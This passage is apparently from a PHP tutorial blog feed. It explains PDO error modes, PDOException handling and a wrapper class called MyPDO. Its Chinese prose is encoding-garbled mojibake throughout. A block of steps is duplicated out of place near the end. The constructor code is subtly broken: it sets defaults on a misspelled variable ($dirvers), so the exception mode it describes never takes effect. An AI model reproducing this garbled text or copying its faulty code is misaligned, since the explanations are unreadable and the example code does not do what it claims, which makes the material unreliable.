å°è£…æˆå‡½æ•°æˆ–è€…ç±»æ¥å®ç°ä»£ç ç®€åŒ–</p><h3 id="2ã€PDOé”™è¯¯æœºåˆ¶"><a href="#2ã€PDOé”™è¯¯æœºåˆ¶" class="headerlink" title="2ã€PDOé”™è¯¯æœºåˆ¶"></a><strong>2ã€PDOé”™è¯¯æœºåˆ¶</strong></h3><blockquote><p>ç›®æ ‡ï¼šäº†è§£PDOä¸­çš„é”™è¯¯æœºåˆ¶ï¼Œç†è§£ä¸åŒæœºåˆ¶çš„ä¸åŒæ•ˆæœ</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>PDOé”™è¯¯æœºåˆ¶</strong>ï¼šæŒ‡PDOåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­å‡ºç°äº†é”™è¯¯ï¼ˆå¤§å¤šæ˜¯SQLæŒ‡ä»¤æ‰§è¡Œé”™è¯¯ï¼‰çš„æ—¶å€™ï¼ŒPDOå¤„ç†é”™è¯¯çš„æ–¹å¼ã€‚</p><ul><li>PDOä¸­æä¾›äº†ä¸‰ç§é”™è¯¯æœºåˆ¶ï¼Œæ˜¯é€šè¿‡PDOçš„å¸¸é‡PDO::ATTR_ERRMODEæ¥é€‰æ‹©çš„<ul><li>PDO::ERRMODE_SILENTï¼šé™é»˜æ¨¡å¼ï¼Œå‡ºé”™äº†ä¸å¤„ç†ï¼ˆé»˜è®¤çš„ï¼‰</li><li>PDO::ERRMODE_WARNINGï¼šè­¦å‘Šæ¨¡å¼ï¼Œå‡ºé”™äº†ç«‹é©¬ç»™å‡ºé”™è¯¯æç¤º</li><li>PDO::ERRMODE_EXCEPTIONï¼šå¼‚å¸¸æ¨¡å¼ï¼Œå‡ºé”™äº†å°†é”™è¯¯äº¤ç»™å¼‚å¸¸PDOExceptionå¯¹è±¡</li></ul></li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€PDO::ERRMODE_SILENTé™é»˜æ¨¡å¼</p><pre><code>$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);$pdo-&gt;exec(&apos;insert into t_40 values()&apos;);        # é”™è¯¯ï¼šä½†æ˜¯ä¸ä¼šæŠ¥é”™</code></pre><p>2ã€PDO::ERRMODE_WARNINGè­¦å‘Šæ¨¡å¼</p><pre><code>$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);# è®¾å®šå¤„ç†æ¨¡å¼ä¸ºè­¦å‘Šæ¨¡å¼$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);$pdo-&gt;exec(&apos;insert into t_40 values()&apos;);        # é”™è¯¯ï¼šç³»ç»Ÿç›´æ¥æŠ¥é”™</code></pre><p>3ã€PDO::ERRMODE_EXCEPTIONå¼‚å¸¸æ¨¡å¼</p><pre><code>$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);try{    $pdo-&gt;exec(&apos;insert into t_40 values()&apos;);    # é”™è¯¯ï¼šè¢«æ•æ‰åˆ°}catch(PDOException $e){    # è¿›å…¥åˆ°å¼‚å¸¸å¤„ç†}</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€PDOæä¾›äº†å¤šç§é”™è¯¯å¤„ç†æœºåˆ¶ï¼šé™é»˜æ¨¡å¼ã€è­¦å‘Šæ¨¡å¼å’Œå¼‚å¸¸æ¨¡å¼ï¼Œé»˜è®¤æ˜¯é™é»˜æ¨¡å¼</p><p>2ã€PDOå¯ä»¥é€šè¿‡PDO::setAttribute()æ–¹æ³•æ¥è®¾å®šé”™è¯¯å¤„ç†æ¨¡å¼</p><h3 id="3ã€PDOExceptionå¼‚å¸¸å¤„ç†"><a href="#3ã€PDOExceptionå¼‚å¸¸å¤„ç†" class="headerlink" title="3ã€PDOExceptionå¼‚å¸¸å¤„ç†"></a><strong>3ã€PDOExceptionå¼‚å¸¸å¤„ç†</strong></h3><blockquote><p>ç›®æ ‡ï¼šæŒæ¡PDOä¸­å¼‚å¸¸çš„å®é™…ä½¿ç”¨ï¼Œèƒ½å¤Ÿç”¨PDOå¼‚å¸¸æœºåˆ¶æ¥å°è£…ä»£ç å¤„ç†å¼‚å¸¸</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>PDOException</strong>ï¼šæ˜¯PDOä»Exceptionç»§æ‰¿çš„ä¸€ä¸ªç”¨äºå¤„ç†PDOé”™è¯¯çš„å¼‚å¸¸ç±»</p><ul><li><p>ä¸€èˆ¬å¦‚æœåšä¸€å¥—æ‰©å±•ï¼Œéƒ½ä¼šä»å»ç»§æ‰¿Exceptionç±»æ¥å®ç°ä¸€å¥—æ˜ç¡®çš„é”™è¯¯æœºåˆ¶ï¼ˆé”™è¯¯æ¥è‡ªå“ªé‡Œï¼‰</p></li><li><p>è¦ä½¿ç”¨PDOExceptionå¼‚å¸¸å¤„ç†ï¼Œéœ€è¦è®¾å®šPDOçš„é”™è¯¯æ¨¡å¼ä¸º<strong>å¼‚å¸¸æ¨¡å¼</strong></p></li><li><p>åœ¨PDOä¸­å¯ä»¥é€šè¿‡ä¸¤ç§æ¨¡å¼æ¥å®ç°å¼‚å¸¸æ¨¡å¼çš„è®¾å®š</p><ul><li>åœ¨åˆå§‹åŒ–PDOå¯¹è±¡çš„æ—¶å€™ï¼Œåˆ©ç”¨ç¬¬å››ä¸ªå‚æ•°æ¥è®¾å®š</li><li>åœ¨åˆå§‹åŒ–PDOä¹‹åï¼Œåˆ©ç”¨PDO::setAttribute()æ–¹æ³•æ¥ä¿®æ”¹é”™è¯¯æ¨¡å¼</li></ul></li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€ç¡®å®šä½¿ç”¨PDOå¼‚å¸¸æ¥å¤„ç†é”™è¯¯</p><p>2ã€è®¾å®šé”™è¯¯æ¨¡å¼ä¸ºå¼‚å¸¸æ¨¡å¼</p><p>3ã€åœ¨å¯èƒ½å‡ºç°é”™è¯¯çš„åœ°æ–¹æ•æ‰å¼‚å¸¸ï¼Œä½¿ç”¨PDOExceptionç±»æ•æ‰</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€è®¾å®šå¼‚å¸¸æ¨¡å¼ï¼šåˆ©ç”¨PDO::__construct()çš„ç¬¬å››ä¸ªå‚æ•°å®ç°æˆ–è€…åœ¨å®ä¾‹åŒ–PDOä¹‹ååˆ©ç”¨PDO::setAttribute()æ–¹æ³•è®¾ç½®ï¼ˆå¿…é¡»åœ¨å¯èƒ½å‡ºé”™å‰å…ˆè®¾ç½®ï¼Œå¦åˆ™å‰é¢å‡ºé”™çš„ä»£ç ä¸ä¼šè¢«å¼‚å¸¸æ•æ‰åˆ°ï¼‰</p><pre><code># 1.åˆå§‹åŒ–PDOæ—¶è®¾å®šé”™è¯¯æ¨¡å¼$drivers = array(    # å¯ä»¥è®¾ç½®å¤šç§é©±åŠ¨ï¼ˆå±æ€§è®¾ç½®ï¼‰    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION);$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;,$drivers);# 2.ä½¿ç”¨å±æ€§è®¾ç½®$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;);$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);</code></pre><p>2ã€å½“ç¡®å®šäº†æˆ‘ä»¬è¦ä½¿ç”¨å¼‚å¸¸æ¨¡å¼å¤„ç†ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥é’ˆå¯¹å¯èƒ½å‡ºé”™çš„ä½ç½®ä½¿ç”¨å¼‚å¸¸æ¥è¿›è¡Œæ•æ‰äº†ï¼ˆé€šå¸¸æ˜¯è¿›è¡ŒSQLæ‰§è¡Œçš„æ—¶å€™ï¼‰</p><pre><code>$drivers = array(    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION);$pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;,$drivers);# æ‰§è¡ŒSQLtry{    $pdo-&gt;exec(&apos;set names utf-8&apos;);        # é”™è¯¯}catch(PDOException $e){    echo &apos;SQLæ‰§è¡Œé”™è¯¯ï¼&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯æ–‡ä»¶ä¸ºï¼š&apos; . $e-&gt;getFile() . &apos;&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯è¡Œå·ä¸ºï¼š&apos; . $e-&gt;getLine() . &apos;&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯æè¿°ä¸ºï¼š&apos; . $e-&gt;getMessage();    die();}</code></pre><p>3ã€ä»PDOæ‰§è¡Œæ¥è®²ï¼Œå› ä¸ºPDOå¼‚å¸¸æ¨¡å¼çš„è®¾ç½®æ˜¯åœ¨PDOå®ä¾‹åŒ–ä¹‹åï¼Œé‚£ä¹ˆå¦‚æœPDOå®ä¾‹åŒ–çš„æ—¶å€™é”™è¯¯ï¼Œæ­¤æ—¶å¥½åƒPDOExceptionå°±æ— æ³•å·¥ä½œäº†ã€‚äº‹å®ä¸Šï¼ŒPDOä¹Ÿè€ƒè™‘åˆ°äº†è¿™ç‚¹ï¼Œæ‰€ä»¥PDOå®ä¾‹åŒ–çš„æ—¶å€™ï¼Œæœ¬èº«æ˜¯å¯ä»¥ä½¿ç”¨try{}catch(){}æ¥æ•è·çš„</p><pre><code>$drivers = array(    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION);# å®ä¾‹åŒ–PDOtry{    $pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;,$drivers);}catch(PDOException $e){    echo &apos;æ•°æ®åº“è¿æ¥å¤±è´¥ï¼&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯æ–‡ä»¶ä¸ºï¼š&apos; . $e-&gt;getFile() . &apos;&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯è¡Œå·ä¸ºï¼š&apos; . $e-&gt;getLine() . &apos;&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯æè¿°ä¸ºï¼š&apos; . iconv(&apos;gbk&apos;,&apos;utf-8&apos;,$e-&gt;getMessage());    die();}</code></pre><p>4ã€PDOæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¦‚æœç¢°åˆ°äº†æ„å¤–ï¼ˆé€»è¾‘æ— æ³•ç»§ç»­æ‰§è¡Œï¼‰ï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥ä¸»åŠ¨æŠ›å‡ºå¼‚å¸¸</p><pre><code>$drivers = array(    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION);# å®ä¾‹åŒ–PDOtry{    $pdo = new PDO(&apos;mysql:host=localhost;port=3306;dbname=db_2&apos;,&apos;root&apos;,&apos;root&apos;,$drivers);}catch(PDOException $e){    echo &apos;æ•°æ®åº“è¿æ¥å¤±è´¥ï¼&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯æ–‡ä»¶ä¸ºï¼š&apos; . $e-&gt;getFile() . &apos;&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯è¡Œå·ä¸ºï¼š&apos; . $e-&gt;getLine() . &apos;&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯æè¿°ä¸ºï¼š&apos; . $e-&gt;getMessage();    die();}# æŠ“å¼‚å¸¸try{    $pdo-&gt;exec(&apos;insert into t_40 values&apos;);    $id = $pdo-&gt;lastInsertID();    if(!$id) throw new PDOException(&apos;æ²¡æœ‰æ‹¿åˆ°è‡ªå¢é•¿IDï¼šæ’å…¥å¤±è´¥&apos;);}catch(PDOException $e){    echo &apos;SQLæ‰§è¡Œå¤±è´¥ï¼&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯æ–‡ä»¶ä¸ºï¼š&apos; . $e-&gt;getFile() . &apos;&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯è¡Œå·ä¸ºï¼š&apos; . $e-&gt;getLine() . &apos;&lt;br/&gt;&apos;;    echo &apos;é”™è¯¯æè¿°ä¸ºï¼š&apos; . $e-&gt;getMessage();    die();}</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€PDOExceptionæ˜¯ä¸€ç§ç”¨æ¥æ•è·å¼‚å¸¸PDOï¼ˆPDOStatementï¼‰ç±»ä½¿ç”¨è¿‡ç¨‹ä¸­äº§ç”Ÿçš„é”™è¯¯çš„</p><p>2ã€PDOExceptionåœ¨ä½¿ç”¨ä¹‹å‰éœ€è¦å¼€å¯PDOçš„å¼‚å¸¸æ¨¡å¼ï¼ˆPDOçš„å®ä¾‹åŒ–é™¤å¤–ï¼Œå¯ä»¥ç›´æ¥æ•æ‰ï¼‰</p><p>3ã€å› ä¸ºè¦å¤„ç†çš„å¼‚å¸¸é€šå¸¸ç±»ä¼¼ï¼Œéƒ½æ˜¯ä¸€äº›ä¸ç”¨æˆ·ç›¸å…³çš„æ“ä½œï¼Œæ‰€ä»¥å¯ä»¥ä¹Ÿåº”è¯¥å¯¹è¿™ç§å¤„ç†è¿›è¡Œå°è£…å¤„ç†ï¼ˆç‹¬ç«‹å‡ºæ¥ï¼‰</p><p>4ã€PDOExceptionä¸€èˆ¬æ˜¯åœ¨SQLæ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºé”™ï¼Œå¦‚æœå…¶ä»–ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¸šåŠ¡é€»è¾‘ä¸ç¬¦åˆè¦æ±‚ï¼ˆä»£ç æ²¡é—®é¢˜ï¼‰ï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥ä½¿ç”¨throw new PDOException()æ¥å®ç°æŠ›å‡ºå¼‚å¸¸</p><h2 id="å››ã€-å°è£…PDOã€æŒæ¡ã€‘"><a href="#å››ã€-å°è£…PDOã€æŒæ¡ã€‘" class="headerlink" title="å››ã€ å°è£…PDOã€æŒæ¡ã€‘"></a><strong>å››ã€ å°è£…PDOã€æŒæ¡ã€‘</strong></h2><blockquote><p>ç›®æ ‡ï¼šç†è§£å¤–éƒ¨æˆ–è€…ç³»ç»Ÿç±»çš„ä¼˜ç¼ºç‚¹ï¼Œæ€è€ƒè‡ªå·±å¼€å‘æ—¶è¦å¦‚ä½•ä½¿ç”¨ï¼Œå¯¹å·²æœ‰ç±»å¯ä»¥è¿›è¡ŒäºŒæ¬¡å°è£…</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>å°è£…PDO</strong>:å³å¯¹PDOè¿›è¡ŒäºŒæ¬¡å°è£…ï¼Œä»è€Œè®©åŸæœ¬å¤šå¤„éœ€è¦ä½¿ç”¨PDOçš„åœ°æ–¹ï¼Œèƒ½å¤Ÿç›´æ¥ä½¿ç”¨äºŒæ¬¡å°è£…çš„ç±»ï¼Œç®€åŒ–æ•°æ®åº“æ“ä½œ</p><ul><li>PDOç±»è¦ä½¿ç”¨çš„è¯æ¯æ¬¡éƒ½éœ€è¦è¿›è¡Œåˆå§‹åŒ–æ“ä½œï¼Œè€Œä¸”ä¸å¤Ÿçµæ´»</li><li>PDOç±»è¦è¿›è¡ŒæŸäº›æ“ä½œçš„æ—¶å€™ï¼Œéœ€è¦è¿›è¡Œè¾ƒå¤šæ­¥éª¤å®ç°</li><li>PDOç±»é»˜è®¤ä¸æ˜¯å¼‚å¸¸å¤„ç†</li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€æ˜ç¡®PDOéœ€è¦å°è£…çš„å†…å®¹</p><ul><li>PDOçš„å®ä¾‹åŒ–ï¼šå¾—åˆ°PDOå¯¹è±¡ï¼Œè€Œä¸”PDOå¯¹è±¡éœ€è¦åœ¨ä¸åŒçš„æ–¹æ³•ä¸­ä½¿ç”¨ï¼Œå¯ä»¥è€ƒè™‘å°†PDOå¾—åˆ°çš„å¯¹è±¡ä¿å­˜åœ¨å±æ€§ä¸­</li><li>å†™æ“ä½œï¼šåŒ…å«æ™®é€šSQLæ‰§è¡Œè¿”å›å—å½±å“è¡Œå’Œè·å–è‡ªå¢é•¿ID</li><li>æŸ¥æ“ä½œï¼šåŒ…å«å•è¡ŒæŸ¥è¯¢å’Œå¤šè¡ŒæŸ¥è¯¢</li><li>éšè—æ“ä½œï¼šå¼‚å¸¸å¤„ç†çš„å°è£…</li><li>å…¶ä»–æ“ä½œï¼šæ ¹æ®å®é™…éœ€æ±‚å¢åŠ å¯¹åº”åŠŸèƒ½å³å¯</li></ul><p>2ã€ä½¿ç”¨å‘½åç©ºé—´æ–¹ä¾¿ä½¿ç”¨</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€å¢åŠ å‘½åç©ºé—´ï¼šå¹¶å¼•å…¥ç³»ç»Ÿç±»ï¼ˆç³»ç»Ÿç±»ä¸èƒ½è‡ªåŠ¨è·¨å…¨å±€ç©ºé—´è¿›å…¥åˆ°å­ç©ºé—´ï¼‰</p><pre><code># å‘½åç©ºé—´ï¼šå› ä¸ºPDOé€šå¸¸å±äºæ ¸å¿ƒç±»ï¼ˆé¡¹ç›®ä¸­å‡ ä¹æ¯æ¬¡éƒ½ä¼šè®¿é—®æ•°æ®åº“ï¼‰ï¼Œä½¿ç”¨æ ¸å¿ƒå…³é”®å­—coreå‘½ånamespace core;# æœ‰äº†å‘½åç©ºé—´ï¼Œæ‰€ä»¥PDOçš„ä¸‰ä¸ªç±»å°±ä¸å†ç›´æ¥ä½¿ç”¨ï¼Œéœ€è¦ä½¿ç”¨å®Œå…¨é™å®šåç§°è®¿é—®ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œå¯ä»¥äº‹å…ˆå¼•å…¥å…ƒç´ use \PDO,\PDOStatement,\PDOException;</code></pre><p>2ã€å®šä¹‰ç±»ï¼šå¢åŠ å¿…è¦å±æ€§ï¼ˆPDOå¯¹è±¡ï¼‰</p><pre><code>class MyPDO{    # å±æ€§    private $pdo;    private $fetch_mode;    public $error;}</code></pre><p>3ã€å¢åŠ åˆå§‹åŒ–æ–¹æ³•ï¼šå¾—åˆ°PDOå¯¹è±¡ï¼šè€ƒè™‘å‚æ•°çš„å¤–éƒ¨ä¼ å…¥å’Œé»˜è®¤å€¼ï¼Œæ•°æ®è¾ƒå¤šå¯ä»¥é‡‡ç”¨å…³è”æ•°ç»„ï¼ˆå¼‚å¸¸å¤„ç†ï¼‰</p><pre><code># æ„é€ æ–¹æ³•# é»˜è®¤é‡‡ç”¨PDOå¼‚å¸¸å’Œè·å–å…³è”æ•°ç»„è®¾å®špublic function __construct($database_info = array(),$drivers = array()){    # å¦‚æœè¦è€ƒè™‘ç»†è‡´ï¼Œå¯ä»¥çœ‹çœ‹æ˜¯å¦å­˜åœ¨    $type = $database_info[&apos;type&apos;] ?? &apos;mysql&apos;;        # é»˜è®¤mysqlæ•°æ®åº“    $host = $database_info[&apos;host&apos;] ?? &apos;localhost&apos;;    $port = $database_info[&apos;port&apos;] ?? &apos;3306&apos;;    $user = $database_info[&apos;user&apos;] ?? &apos;root&apos;;    $pass = $database_info[&apos;pass&apos;] ?? &apos;root&apos;;    $dbname = $database_info[&apos;dbname&apos;] ?? &apos;db_2&apos;;    $charset = $database_info[&apos;charset&apos;] ?? &apos;utf8&apos;;    # fetchmodeä¸èƒ½åœ¨åˆå§‹åŒ–çš„æ—¶å€™å®ç°ï¼Œéœ€è¦åœ¨å¾—åˆ°PDOStatementç±»å¯¹è±¡å¥½è®¾ç½®    $this-&gt;fetch_mode = $dirvers[PDO::ATTR_DEFAULT_FETCH_MODE] ?? PDO::FETCH_ASSOC;    # æ§åˆ¶å±æ€§    if(!isset($dirvers[PDO::ATTR_ERRMODE]))        $dirvers[PDO::ATTR_ERRMODE] = PDO::ERRMODE_EXCEPTION;    # è¿æ¥è®¤è¯    try{        # å¢åŠ é”™è¯¯æŠ‘åˆ¶ç¬¦é˜²æ­¢æ„å¤–        $this-&gt;pdo = @new PDO($type . &apos;:host=&apos; . $host . &apos;;port=&apos; . $port . &apos;;dbname=&apos; . $dbname . &apos;;charset=&apos; . $charset,$user,$pass,$drivers);    }catch(PDOException $e){        # å±æ€§è®°å½•é”™è¯¯        $this-&gt;error[&apos;file&apos;] = $e-&gt;getFile();        $this-&gt;error[&apos;line&apos;] = $e-&gt;getLine();        $this-&gt;error[&apos;error&apos;]= $e-&gt;getMessage();        # è¿”å›falseï¼Œè®©å¤–éƒ¨å¤„ç†        return false;    }   }</code></pre><p>4ã€å‘ç°å¼‚å¸¸ä¼šç»å¸¸ç”¨åˆ°ï¼Œå› æ­¤å¯ä»¥å°†å¼‚å¸¸å°è£…åˆ°æ–¹æ³•ï¼Œä»è€Œåˆ°å¤„è°ƒç”¨ï¼ˆå¯¹å†…è°ƒç”¨ï¼‰</p><pre><code># å¼‚å¸¸å¤„ç†æ–¹æ³•private function my_exception(PDOException $e){    $this-&gt;error[&apos;file&apos;] = $e-&gt;getFile();    $this-&gt;error[&apos;line&apos;] = $e-&gt;getLine();    $this-&gt;error[&apos;error&apos;]= $e-&gt;getMessage();    return false;}</code></pre><p><strong>æ³¨æ„</strong>ï¼šæ­¤æ—¶å°±å¯ä»¥è°ƒæ•´æ„é€ æ–¹æ³•ä¸­å…³äºåˆå§‹åŒ–PDOå¯¹è±¡çš„å¼‚å¸¸å¤„ç†éƒ¨åˆ†ä¸ºå¼‚å¸¸æ–¹æ³•</p><p>5ã€å¢åŠ å†™SQLæ“ä½œæ–¹æ³•ï¼šå¯¹å¤–è°ƒç”¨</p><pre><code># å†™æ“ä½œpublic function my_exec($sql){    try{        # è°ƒç”¨æ‰§è¡Œï¼šæˆåŠŸè¿”å›ï¼Œé”™è¯¯æ•æ‰        return $this-&gt;pdo-&gt;exec($sql);    }catch(PDOException $e){        return $this-&gt;my_exception($e);    }}</code></pre><p>6ã€å®Œå–„å†™æ“ä½œï¼šå¢åŠ å¯¹å¤–æä¾›è‡ªå¢é•¿idæ–¹æ³•</p><pre><code># è·å–è‡ªå¢é•¿IDpublic function my_last_insert_id(){    return $this-&gt;pdo-&gt;lastInsertId();}</code></pre><p>7ã€å¢åŠ è¯»æ–¹æ³•ï¼šå¯¹å¤–è°ƒç”¨</p><pre><code># è¯»æ–¹æ³•ï¼šæŒ‰æ¡ä»¶è¿›è¡Œå•è¡Œæˆ–è€…å¤šè¡Œæ•°æ®è¿”å›public function my_query($sql,$only = true){    try{        $stmt = $this-&gt;pdo-&gt;query($sql);        # è®¾ç½®æŸ¥è¯¢æ¨¡å¼        $stmt-&gt;setFetchMode($this-&gt;fetch_mode);    }catch(PDOException $e){        return $this-&gt;my_exception($e);    }    # æ•°æ®è§£æ    if($only)        return $stmt-&gt;fetch();    else        return $stmt-&gt;fetchAll();}</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€PDOçš„ä½¿ç”¨æ˜¯ç»å¸¸æ€§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†PDOå˜å¾—æ›´åŠ çµæ´»ï¼Œæ›´åŠ è´´è¿‘æˆ‘ä»¬çš„é¡¹ç›®ï¼Œä»è€Œå®ç°æ›´å¤šä»£ç çš„å¤ç”¨ï¼Œå› æ­¤éœ€è¦å¯¹PDOè¿›è¡ŒäºŒæ¬¡å°è£…</p><p>2ã€PDOçš„å°è£…æ˜¯è¦æ ¹æ®é¡¹ç›®éœ€æ±‚æ¥å®ç°çš„ï¼Œå¦‚æœåªæ˜¯åŸºç¡€åŠŸèƒ½ï¼Œé‚£ä¹ˆå®ç°äº†å¢åˆ æ”¹æŸ¥å³å¯ï¼›è€Œå¦‚æœé¡¹ç›®é‡Œè¦ç”¨åˆ°æ›´å¤šçš„å†…å®¹ï¼Œå¦‚äº‹åŠ¡ã€é¢„å¤„ç†ä¹‹ç±»çš„ï¼Œé‚£ä¹ˆå°±éœ€è¦è¿›è¡Œæ›´å¤šçš„å°è£…</p><pre><code>    # è¿”å›falseï¼Œè®©å¤–éƒ¨å¤„ç†    return false;}   </code></pre><p>}</p><pre><code>4ã€å‘ç°å¼‚å¸¸ä¼šç»å¸¸ç”¨åˆ°ï¼Œå› æ­¤å¯ä»¥å°†å¼‚å¸¸å°è£…åˆ°æ–¹æ³•ï¼Œä»è€Œåˆ°å¤„è°ƒç”¨ï¼ˆå¯¹å†…è°ƒç”¨ï¼‰```php# å¼‚å¸¸å¤„ç†æ–¹æ³•private function my_exception(PDOException $e){    $this-&gt;error[&apos;file&apos;] = $e-&gt;getFile();    $this-&gt;error[&apos;line&apos;] = $e-&gt;getLine();    $this-&gt;error[&apos;error&apos;]= $e-&gt;getMessage();    return false;}</code></pre><p><strong>æ³¨æ„</strong>ï¼šæ­¤æ—¶å°±å¯ä»¥è°ƒæ•´æ„é€ æ–¹æ³•ä¸­å…³äºåˆå§‹åŒ–PDOå¯¹è±¡çš„å¼‚å¸¸å¤„ç†éƒ¨åˆ†ä¸ºå¼‚å¸¸æ–¹æ³•</p><p>5ã€å¢åŠ å†™SQLæ“ä½œæ–¹æ³•ï¼šå¯¹å¤–è°ƒç”¨</p><pre><code># å†™æ“ä½œpublic function my_exec($sql){    try{        # è°ƒç”¨æ‰§è¡Œï¼šæˆåŠŸè¿”å›ï¼Œé”™è¯¯æ•æ‰        return $this-&gt;pdo-&gt;exec($sql);    }catch(PDOException $e){        return $this-&gt;my_exception($e);    }}</code></pre><p>6ã€å®Œå–„å†™æ“ä½œï¼šå¢åŠ å¯¹å¤–æä¾›è‡ªå¢é•¿idæ–¹æ³•</p><pre><code># è·å–è‡ªå¢é•¿IDpublic function my_last_insert_id(){    return $this-&gt;pdo-&gt;lastInsertId();}</code></pre><p>7ã€å¢åŠ è¯»æ–¹æ³•ï¼šå¯¹å¤–è°ƒç”¨</p><pre><code># è¯»æ–¹æ³•ï¼šæŒ‰æ¡ä»¶è¿›è¡Œå•è¡Œæˆ–è€…å¤šè¡Œæ•°æ®è¿”å›public function my_query($sql,$only = true){    try{        $stmt = $this-&gt;pdo-&gt;query($sql);        # è®¾ç½®æŸ¥è¯¢æ¨¡å¼        $stmt-&gt;setFetchMode($this-&gt;fetch_mode);    }catch(PDOException $e){        return $this-&gt;my_exception($e);    }    # æ•°æ®è§£æ    if($only)        return $stmt-&gt;fetch();    else        return $stmt-&gt;fetchAll();}</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€PDOçš„ä½¿ç”¨æ˜¯ç»å¸¸æ€§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†PDOå˜å¾—æ›´åŠ çµæ´»ï¼Œæ›´åŠ è´´è¿‘æˆ‘ä»¬çš„é¡¹ç›®ï¼Œä»è€Œå®ç°æ›´å¤šä»£ç çš„å¤ç”¨ï¼Œå› æ­¤éœ€è¦å¯¹PDOè¿›è¡ŒäºŒæ¬¡å°è£…</p><p>2ã€PDOçš„å°è£…æ˜¯è¦æ ¹æ®é¡¹ç›®éœ€æ±‚æ¥å®ç°çš„ï¼Œå¦‚æœåªæ˜¯åŸºç¡€åŠŸèƒ½ï¼Œé‚£ä¹ˆå®ç°äº†å¢åˆ æ”¹æŸ¥å³å¯ï¼›è€Œå¦‚æœé¡¹ç›®é‡Œè¦ç”¨åˆ°æ›´å¤šçš„å†…å®¹ï¼Œå¦‚äº‹åŠ¡ã€é¢„å¤„ç†ä¹‹ç±»çš„ï¼Œé‚£ä¹ˆå°±éœ€è¦è¿›è¡Œæ›´å¤šçš„å°è£…</p><p>3ã€å°è£…å¥½çš„PDOç±»ï¼Œæˆ‘ä»¬å¯ä»¥æ›´åŠ æ–¹ä¾¿çš„å»å®ç°æˆ‘ä»¬çš„ä¸šåŠ¡éœ€æ±‚ï¼ˆå®ä¾‹åŒ–ä»¥åŠè°ƒç”¨å…·ä½“æ–¹æ³•å³å¯ï¼Œåç»­å­¦ä¹ è¿˜æœ‰åŠæ³•å®ç°æ›´ç®€å•çš„è°ƒç”¨ï¼‰</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phpé¢å‘å¯¹è±¡:å‘½ä»¤ç©ºé—´</title>
      <link href="/2021/07/25/php%E5%AD%A6%E4%B9%A0/4PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%9A%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"/>
      <url>/2021/07/25/php%E5%AD%A6%E4%B9%A0/4PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%9A%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</url>
      
